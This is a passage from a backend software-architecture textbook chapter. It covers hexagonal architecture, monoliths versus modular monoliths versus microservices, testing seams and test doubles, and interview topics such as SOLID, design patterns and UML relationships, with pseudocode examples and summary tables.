- **Overkill for thin applications.** A service that mostly moves data between HTTP and a table (create-read-update-delete with little logic) gains little: the "core" would be nearly empty, and the ceremony would be most of the code.
- **The database is rarely swappable.** Ports make it *possible* to replace PostgreSQL with something else, but transaction semantics, isolation behaviour and query capabilities differ so much (Chapters 17 and 23) that the port rarely hides them completely. The realistic benefits are testability of the core, isolation of volatile integrations (payment providers, email services, other teams' APIs), and reuse of use cases by several entry points.

### Layered versus hexagonal

| | Layered | Hexagonal / clean |
|---|---|---|
| Dependency direction | downward, ending at the database | inward, towards the core |
| Business logic depends on | the data-access layer | only its own ports |
| Testing business rules | needs a database or mocks of concrete classes | in-memory adapters; no infrastructure |
| Multiple entry points | possible, but the controller often holds logic | natural: each is a driving adapter |
| Number of types | lower | higher (ports, adapters, separate models) |
| Best fit | simple to moderate logic, data-centric services | rich business rules, many integrations, long-lived code |

The two are closer than they look. A layered design whose service depends on a repository **interface** owned by the service package, with the SQL implementation elsewhere, is already most of the way to hexagonal. The real difference is the rule about which side owns the interface and which way source dependencies point.

### Guarantees and non-guarantees

When the dependency rule is enforced, the core compiles and runs without any infrastructure, its tests need no database or network, and replacing an adapter touches no business code. It does not guarantee that ports are well designed (a port that returns database cursors leaks the database through the interface), that adapters are free of business logic, or that domain and persistence models stay consistent; and it does not make infrastructure differences disappear.

### Failure and diagnosis

- **Leaky ports.** A port's methods take or return infrastructure types (ORM entities, query builders, HTTP responses). Evidence: imports of framework or driver packages in `core`. Fix: ports speak domain types only.
- **Table-shaped ports.** One repository interface per table with generic `update(fields)` methods. The core then does relational work through an interface, without the benefits of either. Fix: design ports around what the use case needs.
- **Business logic in adapters.** A controller or SQL adapter that decides business outcomes; the queue consumer then behaves differently from the HTTP endpoint. Evidence: different results for the same command through different entry points.
- **Mapping drift.** A new field added to the domain but not to the persistence mapping, silently dropped on save. Evidence: values that read back as null. Prevention: round-trip tests for every adapter (save, load, compare).
- **Rule erosion.** Over time someone imports an adapter into the core "just once". Prevention: architecture tests (ArchUnit in Java, import linters in other languages) that fail the build.

### Backend connection

Use hexagonal structure where business logic is rich or integrations are many, and especially around integrations you do not control, such as payment providers and other teams' APIs. Keep it light where the service is a thin data pipe. In either case, the useful discipline is the same: business logic should not name its infrastructure.

---

## 12.11 Monolith, Modular Monolith, Microservices

### Definitions

Recall from Chapter 1 (Section 1.9): a **monolith** builds and deploys all business capabilities as **one deployable unit**, usually with one database, and its parts call each other with in-process function calls. A **microservice architecture** splits capabilities into **separately deployable services**, each owning its data and communicating over the network.

A **modular monolith** is a monolith whose code is divided into **modules** with enforced boundaries: each module owns its data, exposes a small public interface, hides its internals, and is reached by other modules only through that interface. It is still deployed as one unit.

A **distributed monolith** is a system deployed as separate services that are so tightly coupled they must be changed, tested and deployed together. It has the costs of microservices and the coupling of a monolith.

A **service boundary** (or module boundary) is the line around one capability: the code and data inside belong to it; everything outside must go through its interface. A **bounded context**, a term from domain-driven design, is a part of the domain inside which each term has one precise meaning; it is a common guide for drawing boundaries. "Customer" in the billing context (a payer with tax details) and in the shipping context (a recipient with addresses) can legitimately be different models.

**Data ownership** means each piece of data has exactly one owner, the module or service allowed to write it and responsible for its rules. Others read it through the owner's interface or from copies the owner publishes.

### Why it exists

As an application and its organisation grow, a single deployable unit causes real friction: forty developers merging into one codebase, one release train in which any team's bug blocks every other team's change, one process that must be scaled as a whole even if only search needs more instances, and one technology choice for everything. Microservices address these by giving each team its own deployable unit. But splitting turns function calls into network calls, and Chapter 1 (Section 1.7) showed that network calls bring partial failure, unknown outcomes and latency. The architecture question is how to get the independence without paying more than it is worth.

### Mechanism 1: what changes when a call crosses the network

```text
                              in-process call                 network call (same data centre)
 latency                      nanoseconds                     ~0.5 ms round trip, often 1–10 ms with
                                                              serialisation, TLS, proxies (Chapter 6, Section 6.12)
 failure modes                the process is up or it is not  timeout, refused, reset, slow, partial,
                                                              outcome unknown (Chapter 6, Section 6.14)
 data                         shared objects                  serialised copies; versioned formats
 transaction                  one database transaction        none across services (sagas, Chapter 25)
 refactoring a signature      the compiler finds every caller callers in other repositories, deployed
                                                              at other times (versioning, Chapter 13)
 security                     same process                    authentication between services (Chapter 20)
```

Availability multiplies along synchronous chains. Suppose each service is independently available 99.9% of the time, and a request needs five of them in sequence. The request succeeds only if all five are up: 0.999^5 ≈ 0.995, so about 99.5%. Over a 30-day month (43,200 minutes), 99.9% allows about 43 minutes of failure; 99.5% allows about 216 minutes, three and a half hours. With ten services in the chain, 0.999^10 ≈ 0.990, about seven hours a month. (Real failures are not fully independent, so treat this as an illustration of the direction, not a prediction.) Timeouts, retries, circuit breakers and fallbacks (Chapter 24) exist to fight this arithmetic.

### Mechanism 2: why a shared database couples services

The most common way to build a distributed monolith is to split the code into services but leave them all reading and writing one database.

```text
   Orders service ──┐                         ┌── Billing service
                    │   SHARED DATABASE        │
                    ├──► customers  ◄──────────┤   both write customers.status
                    ├──► orders     ◄──────────┤   billing reads orders directly
                    └──► invoices   ◄──────────┘   orders joins invoices in a report
```

The database has become an interface between the services, but one with no owner, no versioning and no encapsulation. Coupling appears in four forms:

1. **Schema coupling.** Orders renames `orders.total` to `orders.total_cents`. Billing's queries break at the moment the migration runs. The two services must now be released together, which removes the main reason for splitting them.
2. **Semantic coupling.** Billing interprets `customers.status = 'SUSPENDED'` one way; orders writes it with another meaning. No code connects them, so nothing detects the disagreement.
3. **Bypassed invariants.** Orders enforces "a shipped order cannot be cancelled" in its domain model (Section 12.3). Billing updates `orders.status` directly with SQL and skips the rule.
4. **Runtime coupling.** Billing's month-end report scans `orders` and holds locks or saturates I/O; order placement slows down. The services also share one connection budget (Chapter 11, Section 11.5) and one failure: when the database is down, both are.

The remedy is **one owner per table**. Other services ask the owner through its API, or keep their own **copy** of the data they need, updated from events the owner publishes (Chapter 25). Physically, the data can still live on one database server, as long as each service has its own schema and database user with no rights on the others'. Ownership is enforced by permissions, not by good intentions.

### Mechanism 3: the distributed-monolith signature

```text
 One feature ("add gift wrapping") requires:

   web-api ──sync──► orders ──sync──► pricing ──sync──► catalog
      │                 │                                  │
      └── shared "common-model" library with Order, Customer, Product classes
                        │
                        └── all four read the same database tables

   → change the Order class in common-model → rebuild and redeploy all four, in order
   → pricing is slow → orders, web-api time out (temporal coupling, Section 12.1)
   → a release requires a coordinated window for four teams
```

The signs: services deployed in lockstep; a shared library of domain classes; shared tables; long synchronous call chains for one user request; and features that routinely require changes in several services. Each sign is a boundary drawn in the wrong place, or data ownership never established.

### Mechanism 4: how a modular monolith enforces boundaries in one process

```text
 one deployable, one process
 ┌────────────────────────────────────────────────────────────────────────────┐
 │  orders module                 billing module              catalog module    │
 │  ┌──────────────────┐          ┌──────────────────┐       ┌──────────────┐  │
 │  │ api: OrdersApi   │◄─────────│ calls OrdersApi  │       │ api: Catalog │  │
 │  │ (public)         │          │ only             │       │ Api          │  │
 │  │ internal/: hidden│          │ internal/: hidden│       │ internal/    │  │
 │  └────────┬─────────┘          └────────┬─────────┘       └──────┬───────┘  │
 │           │ in-process events: "OrderPlaced" ───────────────────►│          │
 └───────────┼─────────────────────────────┼─────────────────────────┼─────────┘
             ▼                             ▼                         ▼
       schema "orders"               schema "billing"          schema "catalog"
       (only orders' DB user         (only billing's)          (only catalog's)
        can write it)
```

Each module has a public API (a facade of a few methods and DTOs) and internal packages that the build or architecture tests forbid other modules to import. Each module owns its tables, ideally in its own schema; cross-module joins are not allowed, so data is fetched through the API or through events. Calls between modules are still function calls: fast, with no partial failure, and a single transaction **can** still span modules when truly needed (though designing as if it could not keeps future extraction possible).

This keeps most of the monolith's simplicity while building the boundaries that a later split would need. If one module later needs independent scaling or deployment, extracting it is mostly mechanical: its API becomes a network API and its schema moves to its own database. Shopify is a well-known example of a large application organised as a modular monolith, with a tool (Packwerk) that enforces module boundaries in its code; in Java, Spring Modulith provides boundary checks for Spring applications.

Splitting a monolith gradually is usually done with the **strangler fig** pattern: route one capability at a time (by URL path at the gateway, Chapter 10, Section 10.4) to a new service, until the old code for it can be removed.

### Concrete: the trade-off table

| Dimension | Monolith | Modular monolith | Microservices |
|---|---|---|---|
| Deployable units | one | one | many |
| Calls between capabilities | in-process, ns | in-process, through module APIs | network, ms; can fail independently with unknown outcomes |
| Transactions across capabilities | one DB transaction | possible, discouraged across modules | none; sagas and the outbox (Chapter 25) |
| Data ownership | often unclear (any code writes any table) | per module, enforced by tooling and DB permissions | per service, enforced by separate databases or schemas |
| Coupling risk | high without discipline | controlled by enforced boundaries | low if boundaries are right; distributed monolith if wrong |
| Independent deployment | no | no | yes |
| Independent scaling | no (scale everything) | no | yes, per service |
| Fault isolation | a memory leak or a hot loop affects everything | same as monolith | a failing service can be isolated (with timeouts, bulkheads) |
| Technology choice | one stack | one stack | per service (a cost as well as a freedom) |
| Team autonomy | low at large size | medium: separate modules, shared release | high |
| Local development and debugging | simple: one process, one debugger | simple | hard: many processes, distributed tracing (Chapter 26) |
| Operational cost | low: one pipeline, one dashboard | low | high: per-service pipelines, discovery, monitoring, on-call, versioning |
| Consistency | strong within one database | strong within one database | eventual across services (Chapter 22) |
| Refactoring across boundaries | easy | easy, with tooling | hard: APIs, versions, coordinated rollouts |
| Typical fit | small teams, early products | most growing products | many teams needing independent release, or capabilities with very different scaling or reliability needs |

**Conway's Law** (Melvin Conway, 1968) observes that systems tend to mirror the communication structure of the organisations that build them. Microservices pay off mostly as an organisational tool: they let independent teams release independently. With one team, they add the costs in the table without that benefit.

### Guarantees and non-guarantees

Separate deployment guarantees that services can be released and scaled independently, if their interfaces stay compatible. It does not guarantee independence: shared databases, shared domain libraries and synchronous chains recreate coupling across the network. A modular monolith guarantees, when its rules are enforced, that modules cannot reach each other's internals or tables; it does not give fault isolation or independent scaling. No arrangement guarantees good boundaries; drawing them along business capabilities and data ownership is a design judgement.

### Failure and diagnosis

- **Distributed monolith.** Evidence: deployment logs show several services released together most of the time; a shared library of domain classes; services reading each other's tables (database audit logs or grants that allow it). Fix: establish data ownership first, then contracts; merge services that always change together.
- **Latency chains.** A user request triggers ten sequential service calls. Evidence: a distributed trace (Chapter 26) showing a staircase of spans. Fix: parallelise independent calls, keep local copies of reference data, or merge chatty services.
- **Cascading failures.** One slow service takes down its callers (Chapter 11, Lab 2). Evidence: thread dumps and traces stuck on the slow dependency. Fix: timeouts, bulkheads, circuit breakers (Chapter 24).
- **Inconsistent data across services.** An order exists without its invoice. Cause: a multi-service operation with no compensation or reliable messaging. Fix: sagas and the outbox (Chapter 25), plus reconciliation jobs.
- **Monolith pain.** Long builds, merge conflicts, releases blocked by unrelated changes, one module's memory leak crashing all. Evidence: release frequency and lead time; incidents caused by unrelated modules. First response: modularise; extract only where a module truly needs independence.

### Backend connection

Start with a well-modularised monolith unless you already know that independent teams must release independently. Establish data ownership from the first day, because it is the hardest boundary to retrofit and the one whose absence creates a distributed monolith. Extract a service when a module has a concrete reason: a different scaling profile, a different reliability requirement, or a team that is blocked by a shared release. Accept that each extraction trades in-process calls for the failure modes of Chapters 6, 24 and 25.

---

## 12.12 Testing Seams the Architecture Creates

### Definitions

A **seam**, in Michael Feathers' definition, is a place where you can change a program's behaviour without editing the code at that place. A constructor parameter is a seam: the caller decides which object is passed in, so a test can pass a substitute.

A **test double** is a substitute object used in a test in place of a real dependency. The common kinds, in the terms most texts use:

- a **dummy** is passed but never used;
- a **stub** returns fixed answers ("the product has stock 5");
- a **fake** is a working, simplified implementation (an in-memory repository built on a map);
- a **mock** is programmed with expectations about how it will be called, and fails the test if they are not met ("`charge` must be called once with 39.98 EUR");
- a **spy** records how it was called so the test can inspect it afterwards.

A **unit test** checks one small piece of code (a class, a function, a use case) in isolation, with its dependencies replaced by doubles. An **integration test** checks that a piece of code works together with real infrastructure or with other real components: a repository against a real database, a controller through the real framework. An **end-to-end test** drives the whole deployed system through its external interface. A **contract test** checks that a service and its consumers agree on the format and behaviour of the interface between them, without running both together.

### Why it exists

Tests are only useful if they are fast enough to run constantly and reliable enough to trust. Tests that need the whole system (databases, queues, other services) are slow and fail for reasons unrelated to the code under test. Tests that replace everything with doubles are fast but can pass while the real system is broken. The architecture decides which tests are possible: every seam is a place where a test can cut the system, and code without seams can only be tested whole.

### Mechanism: where seams come from, and what each test can see

The techniques in this chapter create seams:

| Seam | Created by | Lets a test |
|---|---|---|
| Constructor parameters | dependency injection (Section 12.4) | pass doubles for repositories, clients and services |
| Ports | hexagonal architecture (Section 12.10) | run the whole core with in-memory adapters |
| An injected `Clock` and random source | removing hidden inputs (Section 12.1) | fix the time and random values |
| Configuration objects | typed configuration (Section 12.9) | run with test settings without environment variables |
| The HTTP layer as a thin adapter | layering (Section 12.2) | test HTTP mapping separately from business rules |
| Service APIs and messages | module and service boundaries (Section 12.11) | test each side against a contract |

```text
                              what it runs                     catches                         misses
 unit (core, with fakes)      domain + use cases, in memory    business-rule bugs              SQL errors, mapping, proxies,
                              ms per test                                                       serialisation, configuration
 integration (adapter)        one adapter + real DB/broker     SQL, constraints, mapping,      business flow across components
                              (in a container), 100s of ms     driver behaviour
 integration (slice/app)      framework + container + proxies  binding, validation, error      other services' real behaviour
                              + real DB                        mapping, transactions, security
 contract                     each side against a shared       format and behaviour drift      anything inside each service
                              contract                         between services
 end-to-end                   the deployed system              wiring, deployment, config      precise cause; slow and flaky
                              seconds to minutes per test
```

The usual shape is the **test pyramid**: many fast unit tests at the bottom, fewer integration tests in the middle, a handful of end-to-end tests at the top. The proportions are a guide, not a rule. What matters is that every kind of bug has some test level that can catch it.

### Concrete: a unit test and an integration test for the same feature

```pseudo
// Unit: the rule, in memory, in milliseconds
test "cannot cancel a shipped order":
    orders = InMemoryOrderRepository()
    orders.save(anOrder(id = 7, status = SHIPPED))
    useCase = CancelOrderUseCase(orders, RecordingNotifier())
    expectError(CannotCancel): useCase.execute(CancelOrder(orderId = 7))
    assert orders.findById(7).status == SHIPPED

// Integration: the SQL adapter against a real PostgreSQL in a throwaway container
test "saving an order and loading it returns the same order":
    db = startContainer("postgres:16"); runMigrations(db)          // schema as in production
    repo = SqlOrderRepository(ConnectionPool(db.url, size = 2))
    original = anOrder(id = 7, lines = 3, total = Money(3998, "EUR"))
    repo.save(original)
    assert repo.findById(7) == original                            // round trip: no field lost

// Integration through the framework: proves the proxy, binding and error mapping work
test "POST /api/orders with an unknown product returns 422 and writes nothing":
    app = startApplication(profile = "test", database = db)        // the real container and proxies
    response = app.http.post("/api/orders", json('{"items":[{"productId":"nope","qty":1}]}'))
    assert response.status == 422
    assert db.count("orders") == 0                                 // the transaction rolled back
```

The third test catches failures that no unit test can. A unit test constructs `OrderService` with `new`, so there is no proxy, no transaction and no security check (Section 12.5). The self-invocation pitfall, a checked exception that commits instead of rolling back, an unmapped error type that becomes `500`, and a field name that the JSON mapper silently ignores (Section 12.7) all pass every unit test and fail here.

A **throwaway container** is a database (or broker) started for the test run in a container (Chapter 4, Section 4.10) and discarded afterwards. Libraries such as Testcontainers (available for Java, Go, Python, .NET and Node.js) manage this. It replaces the older habit of testing against an in-memory database of a **different** engine, which behaves differently in SQL dialect, locking and isolation (Chapter 17), so tests pass against it and fail in production.

### Guarantees and non-guarantees

A passing unit test guarantees that the code under test behaves as asserted **given the doubles' behaviour**. If a double behaves differently from the real dependency (a fake repository that accepts duplicates the real database would reject), the test proves nothing about production. A passing integration test guarantees that the code works with that real dependency and version in the tested configuration. No test level guarantees behaviour under real concurrency and load (Chapter 5, Section 5.14 and Chapter 11 covered stress and load testing), or that production configuration matches the test's.

### Failure and diagnosis

- **Over-mocking.** Tests assert that `repository.save` was called, mirroring the implementation line by line. Symptoms: every refactoring breaks tests; tests pass while real SQL fails. Fix: prefer fakes and state-based assertions for the core; test adapters against real infrastructure.
- **A different database in tests.** Production fails on queries, constraint violations or locking that tests never saw. Evidence: the test configuration names a different engine. Fix: the same engine and version, in a container.
- **No tests through the container.** Transactions, security annotations and error mappings are untested. Evidence: production bugs of the "the annotation did nothing" kind. Fix: a few application-level integration tests per critical use case.
- **Flaky tests.** Tests that pass or fail at random. Causes: the real clock, shared state between tests, ordering assumptions, timing. Fix: inject the clock, isolate data per test, wait for conditions rather than sleeping.
- **Contract drift between services.** Each service's own tests pass, and the integration breaks after a deploy. Fix: consumer-driven contract tests, in which each consumer publishes what it relies on and the provider's build verifies it (tools such as Pact implement this).

### Backend connection

Architecture and testing are the same decision seen from two sides. Constructor injection, ports and injected clocks make the core testable in milliseconds; thin adapters make the infrastructure testable in isolation against real engines; and a few tests through the real framework prove that the parts the container adds (proxies, binding, error mapping) actually work.

---

## 12.13 Placement-Round Topics: SOLID, Classic Design Patterns, Coupling and Cohesion Types, UML Relationships

> **Placement-round topics.** This section is for campus placement rounds, low-level-design interviews, university exams and written tests, where these topics are asked often. The ideas behind them run through Sections 12.1–12.12; here they are collected under the names exams use. **Give your main focus to Sections 12.1–12.12**; read this section before placement rounds and come back to it for revision. Where a topic connects to real backend work, its "Backend connection" says so.

### SOLID

**SOLID** is an acronym for five object-oriented design principles collected by Robert C. Martin.

| Principle | Statement | Plain meaning | Seen in this chapter |
|---|---|---|---|
| **S**ingle Responsibility (SRP) | a module should have one reason to change | high cohesion | the five-reason handler of Section 12.1 |
| **O**pen–Closed (OCP) | open for extension, closed for modification | add behaviour by adding code, not by editing working code | decorators and proxies (Section 12.5); new payment types as new classes |
| **L**iskov Substitution (LSP) | a subtype must be usable wherever its base type is expected, without breaking the caller's expectations | subclasses keep the base type's promises | fakes must behave like the real repository (Section 12.12) |
| **I**nterface Segregation (ISP) | clients should not depend on methods they do not use | several small interfaces instead of one large one | ports designed per use case (Section 12.10) |
| **D**ependency Inversion (DIP) | high-level modules depend on abstractions owned by them, not on low-level details | interfaces point inward | Sections 12.4 and 12.10 |

The classic LSP example: if `Square` is a subclass of `Rectangle`, code that sets a rectangle's width to 5 and height to 4 and expects area 20 breaks when given a square (setting one side sets both). The subtype is syntactically valid and behaviourally wrong. LSP is about behaviour, not just method signatures.

The classic ISP example: a `Worker` interface with `work()` and `eat()` forces a `RobotWorker` to implement `eat()`. Splitting it into `Workable` and `Feedable` lets each class depend only on what it uses.

### Classic design patterns

A **design pattern** is a named, reusable solution to a recurring design problem. The 1994 book *Design Patterns* by Gamma, Helm, Johnson and Vlissides (the "Gang of Four", **GoF**) catalogued 23, in three groups: **creational** (how objects are created: 5 patterns), **structural** (how objects are composed: 7) and **behavioural** (how objects divide responsibilities and communicate: 11). The ones asked most often:

| Pattern | Group | Intent | Where it appears in backends |
|---|---|---|---|
| Singleton | creational | ensure one instance and give global access to it | usually replaced by a container's singleton scope (see below) |
| Factory Method | creational | let subclasses or a method decide which class to instantiate | the factories registered in a DI container (Section 12.4) |
| Abstract Factory | creational | create families of related objects without naming concrete classes | database-driver families: connections, statements, result sets |
| Builder | creational | construct a complex object step by step | HTTP request builders, test-data builders (`anOrder(...)` in Section 12.12) |
| Prototype | creational | create objects by copying an existing one | the container's "prototype" scope borrows the name |
| Adapter | structural | convert one interface into another that clients expect | driven adapters wrapping a provider's API (Section 12.10) |
| Decorator | structural | add responsibilities to an object dynamically by wrapping it | Section 12.5; buffered and compressing streams |
| Proxy | structural | a stand-in that controls access to another object | Section 12.5; lazy-loading ORM objects (Chapter 18) |
| Facade | structural | one simple interface to a complex subsystem | a module's public API (Section 12.11) |
| Composite | structural | treat individual objects and groups of them uniformly (trees) | nested validation rules, UI component trees |
| Strategy | behavioural | make a family of algorithms interchangeable behind one interface | pricing rules, load-balancing algorithms (Chapter 10, Section 10.3) |
| Observer | behavioural | notify dependents automatically when an object changes | in-process domain events; publish–subscribe (Chapter 25) |
| Template Method | behavioural | define an algorithm's skeleton; subclasses fill in steps | framework base classes; transaction templates |
| Command | behavioural | represent a request as an object | the `PlaceOrder` command of Section 12.6; job queues |
| Chain of Responsibility | behavioural | pass a request along a chain until one handles it | middleware and filter chains (Chapter 10, Section 10.6) |
| State | behavioural | change behaviour when internal state changes, by delegating to a state object | order lifecycles (Section 12.3) |
| Iterator | behavioural | traverse a collection without exposing its structure | cursors over query results |

**Strategy versus State** is a frequent question: both delegate to an interchangeable object. In Strategy, the **client** chooses the algorithm and it usually stays fixed; in State, the **object itself** switches its state object as it moves through a lifecycle.

**Proxy versus Decorator** is another: the structure is identical (a wrapper with the same interface); the intent differs (control access versus add behaviour), as Section 12.5 explained.

#### The Singleton pattern, and why backends prefer DI scopes

The GoF Singleton makes the class itself enforce one instance, with a private constructor and a static accessor. A lazily created singleton must be thread-safe, because two threads can call the accessor at the same moment (the check-then-act race of Chapter 5, Section 5.2):

```pseudo
class Registry:                                   // eager: created when the class is initialised
    static INSTANCE = Registry()                  // the runtime guarantees class initialisation runs once
    private constructor()
    static function get(): return INSTANCE

class LazyRegistry:                                // lazy, with double-checked locking
    static volatile instance = null                // volatile: needed for safe publication (Chapter 5, Section 5.3)
    static function get():
        if instance is null:                       // first check, without the lock
            lock(LazyRegistry):
                if instance is null:               // second check, under the lock
                    instance = LazyRegistry()
        return instance
```

> **Java lens:** Idiomatic thread-safe lazy singletons in Java use the **holder idiom** (a private static nested class whose static field holds the instance; the JVM initialises the nested class, once and thread-safely, on first use) or a single-element `enum`, which also resists creation of extra instances through serialisation and reflection.

Backends usually avoid the pattern: a static accessor is a hidden global dependency (Section 12.1), cannot be replaced in tests, and ties every caller to one concrete class. A container's singleton **scope** gives the same "one instance" without those costs, because the instance is still injected through constructors. In an interview, give the pattern, its thread-safe forms, and this trade-off.

### Types of coupling and cohesion

Software engineering exams ask for the classic ranked lists (from structured design, Yourdon and Constantine). They name finer degrees of the same ideas as Section 12.1.

**Coupling, from worst to best:**

| Type | Meaning | Example |
|---|---|---|
| Content | one module modifies or relies on another's internal data or code | reaching into another class's private fields by reflection |
| Common | modules share global data | a global mutable configuration map |
| External | modules share an externally imposed format or device | two modules depending on one file layout |
| Control | one module passes a flag that controls what the other does | `process(order, mode = 3)` |
| Stamp | modules share a composite structure but use only parts of it | passing a whole `Customer` to a function that needs only the email |
| Data | modules share only the elementary data they need | `sendEmail(address, subject, body)` |

**Cohesion, from worst to best:**

| Type | Elements are grouped because... | Example |
|---|---|---|
| Coincidental | no meaningful reason | a `Utils` class |
| Logical | they do similar kinds of things, selected by a flag | `handleAllInput(type)` |
| Temporal | they run at the same time | a `startup()` that opens pools, loads caches and prints a banner |
| Procedural | they follow a sequence of steps | "validate, then log, then format" with unrelated data |
| Communicational | they operate on the same data | functions that all read and update one customer record |
| Sequential | the output of one is the input of the next | parse, then validate, then map (Section 12.6) |
| Functional | they all contribute to one well-defined task | `Money` and its operations |

### UML class-diagram relationships

| Relationship | Meaning | Notation (UML) | Example |
|---|---|---|---|
| Dependency | A uses B briefly (a parameter or local) | dashed arrow | `OrderController` ┄┄> `PlaceOrderRequest` |
| Association | A holds a reference to B | solid line (arrow for direction) | `Order` ── `Customer` |
| Aggregation | whole–part where the part can exist on its own | solid line, hollow diamond at the whole | `Team` ◇── `Developer` |
| Composition | whole–part where the part's life ends with the whole | solid line, filled diamond at the whole | `Order` ◆── `OrderLine` |
| Generalisation (inheritance) | A is a kind of B | solid line, hollow triangle at B | `CardPayment` ──▷ `Payment` |
| Realisation (implementation) | A implements interface B | dashed line, hollow triangle at B | `SqlOrderRepository` ┄┄▷ `OrderRepository` |

Composition matches the aggregate of Section 12.3: order lines do not exist without their order.

### Backend connection

SOLID and the patterns are vocabulary for designs this chapter already uses: the container's factories, the proxy and decorator of Section 12.5, the adapters and facades of Sections 12.10 and 12.11, the middleware chain of Chapter 10. Learn the names so you can explain a design quickly; do not apply patterns for their own sake, because each one adds types and indirection that must pay for themselves.

### Drill for this section

**C1. State the SOLID principles, with an example of a violation for each.**
A strong answer must mention:
- SRP: one reason to change; violation: a handler mixing HTTP, pricing, SQL and email.
- OCP: extend by adding code; violation: a growing `switch` on payment type edited for each new type.
- LSP: subtypes keep the base type's behavioural promises; violation: `Square` extending `Rectangle`.
- ISP: small client-specific interfaces; violation: a fat interface forcing empty implementations.
- DIP: depend on abstractions owned by the high-level module; violation: a service constructing a SQL repository itself.
*Common weak answer:* reciting the five names without examples, or describing DIP as "use dependency injection". DI is a technique; DIP is about which way source dependencies point.

**C2. Write a thread-safe Singleton. Why do many backend codebases avoid the pattern?**
A strong answer must mention:
- An eager static instance, the holder idiom, an enum (in Java), or double-checked locking with a `volatile` field.
- Why plain lazy initialisation is a check-then-act race; why `volatile` is needed for safe publication.
- The pattern's costs: hidden global dependency, hard to replace in tests, coupling to a concrete class.
- The alternative: a DI container's singleton scope, injected through constructors.
*Common weak answer:* double-checked locking without `volatile`, which can publish a partly constructed object.

**C3. Proxy, Decorator, Adapter, Facade: what is the difference?**
A strong answer must mention:
- Proxy and Decorator have the same structure (same interface, wrapping, delegation); Proxy controls access, Decorator adds behaviour.
- Adapter changes an interface into a different one the client expects.
- Facade offers one simplified interface over a whole subsystem.
- A backend example of each (transactional proxy, caching decorator, payment-provider adapter, module API).
*Common weak answer:* "they are all wrappers". True, but the question is about intent and interface change.

**C4. Rank the types of cohesion and coupling. Which do you want?**
A strong answer must mention:
- Cohesion from coincidental to functional; aim for functional (or sequential, communicational).
- Coupling from content to data; aim for data coupling.
- One example for each end, such as a `Utils` class (coincidental) and a control flag parameter (control coupling).
- The link to change: high cohesion and loose coupling keep changes local.
*Common weak answer:* listing the names in the wrong order, or treating "low coupling" and "high cohesion" as unrelated goals.

---

## Chapter Summary

Structure exists for change. A module's **coupling** is how much a change elsewhere forces a change in it; its **cohesion** is how closely its contents belong together. Code that mixes HTTP, business rules, SQL and email in one function changes for every reason and cannot be tested without a database and a clock. Every technique in this chapter manages dependencies: which way they point, who creates them, how behaviour is added to them, and which of them cross a network.

The **layered architecture** gives each common reason for change its own layer. Controllers translate HTTP into method calls and back; services implement one use case per method and own the **transaction**; repositories hide queries behind collection-like interfaces. The **domain model** holds the rules: **value objects** such as `Money` validate themselves once and never change; **entities** such as `Order` keep their identity and guard their state transitions with methods. Separate request and response **DTOs** keep the API's shape independent of the database's and block **mass assignment** and excessive data exposure. Validation sits at three levels: shape at the edge, business rules in the domain, and invariants that must survive concurrency in database constraints.

**Dependency injection** hands an object its collaborators instead of letting it build them, which makes them visible and replaceable. A **container** automates the composition root: it resolves constructor parameters recursively, caches **singletons**, keeps **per-request** instances per request, builds **transients** each time, detects cycles and shuts down in reverse order. Its classic trap is the **captive dependency**, where a singleton keeps the first request's context forever. **Inversion of control** is the general principle that the framework calls your code; the **Dependency Inversion Principle** says which way source dependencies point.

Frameworks add transactions, security and caching through **proxies**: the container wraps a component in a generated object with the same interface, whose methods run **advice** around the real call, and injects that proxy instead of the component. Annotations are only labels that this machinery reads at startup. Because the proxy sees only calls that pass through it, a method calling another method of the same object bypasses the advice: the **self-invocation** pitfall, which silently drops transactions and caching.

A request's data flows from bytes to text, to a JSON tree, to a request DTO, through shape validation (the trust boundary), into domain commands and objects, into rows, and back out through a response DTO to JSON bytes. Each step has an owner and a characteristic failure. **Serialisation** needs deliberate rules for names, unknown and missing fields, numbers, dates and polymorphic types. Letting input choose which class to instantiate turns deserialisation into code execution: **insecure deserialisation**, prevented by binding onto concrete DTOs, closed allowlists for polymorphism, and keeping native object formats away from untrusted data.

Errors fall into domain outcomes, infrastructure failures and bugs. Domain outcomes are explicit; the rest propagate to one central handler that maps each category to a status, a log level and a problem-details body without internal detail. Errors are translated at each boundary, logged once, and never swallowed inside a transaction. **Configuration** comes from outside the artifact through layered sources, is bound into typed objects validated at startup, and keeps secrets masked, rotatable and out of version control.

**Hexagonal architecture** inverts the dependency between business logic and infrastructure: the core defines **ports**, and **adapters** implement or call them, which makes the core testable without infrastructure at the cost of more types and mapping. At system scale, a **monolith**, a **modular monolith** and **microservices** trade simplicity for independence. Network boundaries bring latency, partial failure and multiplied unavailability; a shared database recreates coupling across them, producing a **distributed monolith**; data ownership is the boundary that matters most. Finally, the seams created by injection, ports and thin adapters decide what can be tested: unit tests for the core, integration tests against real engines for adapters, and a few tests through the real container for what the framework adds.

---

## Guarantees vs. Non-Guarantees

| Mechanism | Guarantees | Does NOT guarantee |
|---|---|---|
| Layered architecture | Protocol and storage changes stay in their layers; every entry point reuses the service logic | Good boundaries between features; correctness |
| Service-level transaction | All-or-nothing for one use case, for every entry point | Atomicity of work outside the database (emails, HTTP calls) |
| Value object | Valid wherever it exists; safe to share | Invariants across objects or rows |
| Entity with guarded methods | Its state machine holds for callers that use its methods | Protection against code that writes the database directly |
| Request and response DTOs | Clients set and see only the fields declared | Validity of the values (validation does that) |
| Shape validation | Well-formed input reaches the domain | Business validity; uniqueness under concurrency |
| Database constraints | Invariants hold across all concurrent requests and instances | Friendly error messages without translation |
| DI container | Each object receives its registered dependencies; one singleton per container; cycles and missing beans found at startup (eager creation) | Thread safety of singletons; compatible scopes; one instance per process |
| Proxy-based interception | Advice runs for every call made through the proxy, in a defined order | Interception of self-calls, private or final methods, or objects built with `new` |
| Binding onto concrete DTOs | Only declared classes are constructed | Safety of other deserialisers in the process; resistance to huge or deep input without limits |
| Polymorphism with a closed allowlist | Only listed types can be chosen by input | That listed types are themselves harmless if they have side effects |
| Central error mapping | Consistent status, body and log level for known errors; no internal detail leaked | Correct handling of unmapped errors; knowledge of whether a timed-out operation happened |
| Typed, validated configuration | One artifact for all environments; bad values stop startup | Identical values across instances; secrets that the process itself never leaks |
| Hexagonal architecture | Core runs and is tested without infrastructure; adapters replaceable without touching business code | Well-designed ports; that infrastructure semantics can really be swapped |
| Modular monolith | Enforced module boundaries and data ownership in one deployable | Independent deployment, scaling or fault isolation |
| Microservices | Independent deployment and scaling per service | Independence when databases, libraries or synchronous chains are shared; cross-service transactions |
| Unit tests with doubles | Behaviour given the doubles' behaviour | Behaviour of real infrastructure, proxies, binding or configuration |
